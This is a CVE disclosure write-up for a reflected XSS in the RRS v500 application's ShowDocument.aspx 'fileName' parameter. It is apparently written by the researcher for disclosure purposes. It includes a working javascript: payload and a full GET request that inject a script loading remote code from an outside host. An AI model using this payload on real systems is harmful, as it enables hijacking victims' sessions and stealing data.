# CVE-2022-29598 : Reflected Cross-Site Scripting (XSS) in RSS v500

Mitre URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29598

NIST URL: https://nvd.nist.gov/vuln/detail/CVE-2022-29598

The [RRS](https://solutions-atlantic.com/regulatory-reporting-system/) v500 application by Solutions Atlantic is vulnerable to a reflected Cross-Site Scripting (XSS) vulnerability. Exploitation of an XSS vulnerability could allow an adversary to masquerade as the victim user, disclose of sensitive data, or performs actions that the victim user is allowed to perform. 

The parameter `fileName` was found to accept user input and reflect it within the server's response. While some user input filtering and sanitization was performed prior to reflection, such as some special character encoding (greater/less than symbols), since the reflection occurred within a JavaScript context, JavaScript code could be injected into the server's response, bypassing the restrictions.

Affected URL:

- `/RRSWeb/maint/ShowDocument/ShowDocument.aspx`

XSS payload used:

- `javascript:var%20x=document.createElement("script");x.src="https://thegetch.github.io/x";document.body.appendChild(x)';//`

## Proof of Concept (POC):

### Show Document Functionality:

**Affected URL:** 

- `/RRSWeb/maint/ShowDocument/ShowDocument.aspx`

The application has the ability to link to external websites. When selecting a link to the external site, a request to `/RRSWeb/maint/ShowDocument/ShowDocument.aspx` is made with two parameters, `fileName`, which will contain the URL of the external site to be redirected to, and `requestType`, which will have the value `ExternalLink`. As long as the `requestType` parameter is set with its default value, anything a user puts into the `fileName` parameter will be reflected into a JavaScript context, specifically within a `window.location.href`. Using an XSS payload with a JavaScript directive, a successful Reflected XSS attack can occur. 

**GET request with XSS payload:**

```http
GET /RRSWeb/maint/ShowDocument/ShowDocument.aspx?requestType=ExternalLink&fileName=javascript:var%20x=document.createElement("script");x.src="https://thegetch.github.io/x";document.body.appendChild(x)';// HTTP/1.1
Host: <REDACTED>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
Referer: http://<REDACTED>/RRSweb/default.aspx
Cookie: ASP.NET_SessionId=<REDACTED>
Upgrade-Insecure-Requests: 1
Content-Length: 0


```

Server Response:

![01_RRS_XSS_Response_JS_Directive](https://raw.githubusercontent.com/TheGetch/CVE-2022-XXXXX-XSS/main/01_RRS_XSS_Response_JS_Directive.png)

Rendered in browser:

![02_RRS_XSS_Rendered](https://raw.githubusercontent.com/TheGetch/CVE-2022-XXXXX-XSS/main/02_RRS_XSS_Rendered.png)

## Discovery
April 2022
- Eric Getchell - TheGetch

